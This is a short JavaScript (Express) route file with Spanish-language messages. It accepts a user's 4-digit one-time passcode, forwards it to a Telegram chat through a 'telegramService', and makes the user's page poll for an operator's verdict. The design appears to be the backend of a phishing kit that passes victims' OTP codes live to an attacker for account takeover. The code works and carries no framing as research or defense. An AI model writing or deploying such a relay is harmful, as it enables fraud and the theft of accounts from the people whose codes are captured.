const express = require('express');
const router = express.Router();
const telegramService = require('../services/telegramService');
const sessionService = require('../services/sessionService');
const { validateOtpCode } = require('../middleware/validationMiddleware');

// POST /api/otp/verify
router.post('/verify', async (req, res) => {
  try {
    const { code } = req.body;

    // Validación
    if (!code || !validateOtpCode(code)) {
      return res.status(400).json({ error: 'Código OTP inválido (debe ser 4 dígitos)' });
    }

    // Crear sesión
    const sessionId = sessionService.createSession({
      type: 'otp',
      code,
    });

    // Enviar a Telegram
    await telegramService.sendOtpRequest(sessionId, code);

    // Responder al cliente
    res.json({
      sessionId,
      message: 'Código OTP enviado. Aguardando verificación...',
    });
  } catch (error) {
    console.error('[OTP ERROR]', error);
    res.status(500).json({ error: 'Error al procesar OTP' });
  }
});

// GET /api/otp/status/:sessionId
router.get('/status/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;

    if (!sessionId) {
      return res.status(400).json({ error: 'Session ID requerido' });
    }

    const session = sessionService.getSession(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada o expirada' });
    }

    if (sessionService.isExpired(sessionId)) {
      sessionService.deleteSession(sessionId);
      return res.status(410).json({ error: 'Sesión expirada' });
    }

    res.json({
      sessionId,
      status: session.status,
      response: session.response,
    });
  } catch (error) {
    console.error('[OTP STATUS ERROR]', error);
    res.status(500).json({ error: 'Error al obtener estado OTP' });
  }
});

module.exports = router;
